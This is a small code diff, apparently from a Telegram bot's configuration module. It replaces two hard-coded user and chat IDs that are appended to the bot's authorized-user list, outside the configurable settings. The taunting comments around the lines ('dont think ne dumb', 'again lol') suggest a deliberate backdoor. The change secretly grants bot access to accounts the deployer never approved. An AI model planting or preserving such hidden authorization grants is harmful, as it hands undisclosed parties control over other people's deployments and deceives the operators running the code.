@@ -22,8 +22,8 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(5090651635)
-AUTH_USERS.append(-1002294327145)
+AUTH_USERS.append(1074804932)
+AUTH_USERS.append(-1004946025418)
 # again lol  
 
 SESSION_NAME = Config.SESSION_NAME
